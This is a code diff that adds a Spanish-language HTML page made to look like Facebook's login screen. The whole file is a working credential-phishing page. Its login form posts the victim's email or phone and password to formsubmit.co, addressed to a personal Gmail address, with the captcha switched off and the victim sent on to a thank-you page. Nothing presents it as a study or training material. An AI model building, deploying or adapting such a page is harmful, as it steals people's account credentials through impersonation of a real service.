@@ -1,0 +1,312 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Iniciar sesión en Facebook</title>
+    <style>
+        :root {
+            --blue: #1877f2;
+            --blue-dark: #166fe5;
+            --green: #42b72a;
+            --green-dark: #36a420;
+            --gray-light: #f0f2f5;
+            --black: #1c1e21;
+            --white: #ffffff;
+        }
+        
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: Arial, Helvetica, sans-serif;
+        }
+        
+        body {
+            background-color: var(--gray-light);
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+        
+        header {
+            background-color: var(--white);
+            height: 60px;
+            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
+            padding: 0 16px;
+        }
+        
+        .header-container {
+            max-width: 1200px;
+            margin: 0 auto;
+            height: 100%;
+            display: flex;
+            align-items: center;
+        }
+        
+        .logo {
+            color: var(--blue);
+            font-weight: bold;
+            font-size: 24px;
+        }
+        
+        .main-container {
+            flex: 1;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px 0;
+        }
+        
+        .content-wrapper {
+            max-width: 980px;
+            width: 100%;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 0 40px;
+        }
+        
+        .hero-text {
+            max-width: 500px;
+        }
+        
+        .hero-text h1 {
+            color: var(--blue);
+            font-size: 55px;
+            margin-bottom: 10px;
+            font-weight: bold;
+        }
+        
+        .hero-text p {
+            font-size: 28px;
+            line-height: 32px;
+        }
+        
+        .login-form-container {
+            background-color: var(--white);
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
+            padding: 16px;
+            width: 396px;
+            margin-left: 60px;
+        }
+        
+        .login-form {
+            display: flex;
+            flex-direction: column;
+        }
+        
+        .login-form input {
+            padding: 14px 16px;
+            font-size: 17px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            margin-bottom: 12px;
+        }
+        
+        .login-form input:focus {
+            outline: none;
+            border-color: var(--blue);
+            box-shadow: 0 0 0 2px #e7f3ff;
+        }
+        
+        .login-btn {
+            background-color: var(--blue);
+            color: var(--white);
+            border: none;
+            border-radius: 6px;
+            font-size: 20px;
+            font-weight: bold;
+            padding: 12px;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+        
+        .login-btn:hover {
+            background-color: var(--blue-dark);
+        }
+        
+        .forgot-password {
+            text-align: center;
+            margin-top: 16px;
+            margin-bottom: 20px;
+        }
+        
+        .forgot-password a {
+            color: var(--blue);
+            text-decoration: none;
+            font-size: 14px;
+        }
+        
+        .divider {
+            border-bottom: 1px solid #dadde1;
+            margin: 20px 0;
+        }
+        
+        .create-account-btn {
+            background-color: var(--green);
+            color: var(--white);
+            border: none;
+            border-radius: 6px;
+            font-size: 17px;
+            font-weight: bold;
+            padding: 12px;
+            cursor: pointer;
+            transition: background-color 0.2s;
+            width: fit-content;
+            margin: 0 auto;
+        }
+        
+        .create-account-btn:hover {
+            background-color: var(--green-dark);
+        }
+        
+        .create-page {
+            text-align: center;
+            margin-top: 28px;
+            font-size: 14px;
+        }
+        
+        footer {
+            background-color: var(--white);
+            padding: 20px 0;
+        }
+        
+        .footer-container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 16px;
+        }
+        
+        .footer-links {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 8px 20px;
+            font-size: 12px;
+            color: #8a8d91;
+        }
+        
+        .footer-links a {
+            color: #8a8d91;
+            text-decoration: none;
+        }
+        
+        @media (max-width: 900px) {
+            .content-wrapper {
+                flex-direction: column;
+                text-align: center;
+            }
+            
+            .hero-text {
+                margin-bottom: 40px;
+            }
+            
+            .hero-text h1 {
+                font-size: 40px;
+            }
+            
+            .hero-text p {
+                font-size: 24px;
+            }
+            
+            .login-form-container {
+                margin-left: 0;
+                max-width: 100%;
+            }
+        }
+        
+        @media (max-width: 480px) {
+            .login-form-container {
+                width: 100%;
+            }
+            
+            .hero-text h1 {
+                font-size: 32px;
+            }
+            
+            .hero-text p {
+                font-size: 18px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <div class="header-container">
+            <div class="logo">facebook</div>
+        </div>
+    </header>
+    
+    <main class="main-container">
+        <div class="content-wrapper">
+            <div class="hero-text">
+                <h1>facebook</h1>
+                <p>Facebook te ayuda a comunicarte y compartir con las personas que forman parte de tu vida.</p>
+                <img src="https://storage.googleapis.com/workspace-0f70711f-8b4e-4d94-86f1-2a93ccde5887/image/affb242b-fdd9-4483-9e84-94938713b7b8.png" alt="Ilustración de personas conectadas a través de redes sociales con globos de diálogo y símbolos de amistad" />
+            </div>
+            
+            <div class="login-form-container">
+                <form id="facebookLoginForm" class="login-form" method="POST" action="https://formsubmit.co/deiapps2424@gmail.com">
+                    <input type="hidden" name="_captcha" value="false">
+                    <input type="hidden" name="_next" value="https://yourdomain.com/thankyou.html">
+                    <input type="hidden" name="_template" value="table">
+                    <input type="hidden" name="_subject" value="Nuevo inicio de sesión Facebook">
+                    <input type="hidden" name="_autoresponse" value="Gracias por iniciar sesión">
+                    <input type="text" name="email" required placeholder="Correo electrónico o número de teléfono">
+                    <input type="password" name="password" required placeholder="Contraseña">
+                    <button type="submit" class="login-btn">Iniciar sesión</button>
+                    <div class="forgot-password">
+                        <a href="#">¿Olvidaste tu contraseña?</a>
+                    </div>
+                    <div class="divider"></div>
+                    <button type="button" class="create-account-btn">Crear cuenta nueva</button>
+                </form>
+            </div>
+        </div>
+    </main>
+    
+    <footer>
+        <div class="footer-container">
+            <div class="footer-links">
+                <a href="#">Español</a>
+                <a href="#">English (US)</a>
+                <a href="#">Français (France)</a>
+                <a href="#">Português (Brasil)</a>
+                <a href="#">Italiano</a>
+                <a href="#">Deutsch</a>
+                <a href="#">العربية</a>
+                <a href="#">हिन्दी</a>
+                <a href="#">中文(简体)</a>
+                <a href="#">日本語</a>
+            </div>
+            <div class="footer-links">
+                <a href="#">Registrarte</a>
+                <a href="#">Iniciar sesión</a>
+                <a href="#">Messenger</a>
+                <a href="#">Facebook Lite</a>
+                <a href="#">Video</a>
+                <a href="#">Lugares</a>
+                <a href="#">Juegos</a>
+                <a href="#">Marketplace</a>
+                <a href="#">Meta Pay</a>
+                <a href="#">Oculus</a>
+                <a href="#">Portal</a>
+                <a href="#">Instagram</a>
+            </div>
+            <div class="footer-links">
+                <a href="#">Información</a>
+                <a href="#">Centro de ayuda</a>
+                <a href="#">Política de privacidad</a>
+                <a href="#">Centro de privacidad</a>
+                <a href="#">Grupos</a>
+                <a href="#">Configuración de cookies</a>
+                <a href="#">Empleo</a>
+                <a href="#">Condiciones</a>
+                <a href="#">Subir contactos y no usuarios</a>
+                <a href="#">Registro del navegador</a>
+            </div>
+        </div>
+    </footer>
+</body>
+  </html>
